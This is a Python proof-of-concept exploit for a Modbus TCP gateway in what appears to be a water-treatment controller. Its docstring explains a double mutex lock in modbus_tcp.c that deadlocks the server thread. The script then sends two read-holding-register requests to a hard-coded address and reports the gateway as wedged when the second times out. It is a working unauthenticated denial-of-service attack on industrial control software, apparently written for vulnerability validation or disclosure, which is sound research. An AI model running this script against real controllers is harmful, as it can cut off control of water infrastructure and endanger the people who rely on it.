#!/usr/bin/env python3
"""
PoC for VULN_FINDING_D - Modbus TCP gateway one-shot deadlock

Target: water-controller modbus_tcp.c server thread, port 1502
Bug:    server_thread_func() in modbus_tcp.c has a recursive lock bug:
        after handle_client_request() returns successfully, the loop
        re-acquires ctx->lock TWICE in a row on the same thread, against
        a NON-recursive (default) pthread mutex. The second lock attempt
        deadlocks the entire gateway thread permanently.

        Code (modbus_tcp.c lines ~255-289):

            pthread_mutex_lock(&ctx->lock);
            for (int i = 0; i < MODBUS_TCP_MAX_CONNECTIONS; i++) {
                if (ctx->clients[i].active && FD_ISSET(...)) {
                    int client_fd = ctx->clients[i].fd;
                    pthread_mutex_unlock(&ctx->lock);

                    /* peek */
                    int ret = recv(client_fd, ...);
                    if (disconnect) { ... }
                    else {
                        handle_client_request(ctx, client_fd);
                        pthread_mutex_lock(&ctx->lock);          // re-lock #1
                        ctx->clients[i].last_activity_ms = ...;
                    }
                    pthread_mutex_lock(&ctx->lock);              // re-lock #2 -- DEADLOCK
                }
            }

        pthread_mutex_init(&tcp->lock, NULL) creates a NON-recursive
        (PTHREAD_MUTEX_NORMAL on glibc) mutex. Re-locking from the same
        thread is UB; on Linux it deadlocks.

Effect: ONE single Modbus request is enough to permanently wedge the
        Modbus TCP gateway. All subsequent requests hang. The only
        recovery is restarting the controller process. CWE-667 (improper
        locking) leading to CWE-400 (unauthenticated DoS).

Severity: HIGH availability impact, no integrity impact, no confidentiality
          impact. Unauthenticated, single packet, no special privileges.
          CVSS 3.1: 7.5 AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

Validation: send any single valid Modbus request (e.g. FC 0x03 read holding
            registers), confirm a clean reply, then send a second request and
            observe the timeout / hang.
"""

import socket
import struct
import sys
import time

TARGET = ("192.168.6.13", 1502)
UNIT_ID = 1


def fc03_read(sock: socket.socket, trans_id: int, start: int, qty: int) -> bytes:
    pdu = struct.pack(">BHH", 0x03, start, qty)
    mbap = struct.pack(">HHHB", trans_id, 0, 1 + len(pdu), UNIT_ID)
    sock.sendall(mbap + pdu)
    return sock.recv(512)


def main() -> int:
    print(f"[*] Target: {TARGET[0]}:{TARGET[1]}")
    print()

    # Request 1: should succeed
    print("[*] Request 1: FC 0x03 read 1 holding register at addr 0")
    s1 = socket.create_connection(TARGET, timeout=10)
    t0 = time.time()
    try:
        resp = fc03_read(s1, 0x0001, 0x0000, 1)
        print(f"    [+] {time.time()-t0:.2f}s  reply: {resp.hex()}")
    except Exception as e:
        print(f"    [!] {time.time()-t0:.2f}s  error: {e}")
        return 1
    s1.close()
    time.sleep(0.5)

    # Request 2: should ALSO succeed on a healthy gateway, but will hang
    # because the server thread is already wedged on its own mutex.
    print()
    print("[*] Request 2: same FC 0x03 from a brand-new TCP connection")
    s2 = socket.create_connection(TARGET, timeout=10)
    t0 = time.time()
    try:
        resp = fc03_read(s2, 0x0002, 0x0000, 1)
        print(f"    [+] {time.time()-t0:.2f}s  reply: {resp.hex()}")
        print()
        print("    NOTE: gateway responded - the deadlock theory may be wrong,")
        print("    or your environment uses a recursive mutex, or the timing")
        print("    of accept-vs-deadlock is different. Re-validate.")
    except socket.timeout:
        print(f"    [+] {time.time()-t0:.2f}s  TIMEOUT - gateway is wedged")
        print()
        print("    BUG CONFIRMED: a SINGLE successful Modbus request put the")
        print("    server thread into a permanent self-deadlock on ctx->lock.")
        print("    The gateway will accept new TCP connections (kernel does")
        print("    that) but will never process them until the controller is")
        print("    restarted.")
        return 0
    except Exception as e:
        print(f"    [!] {time.time()-t0:.2f}s  error: {e}")
        return 1
    s2.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
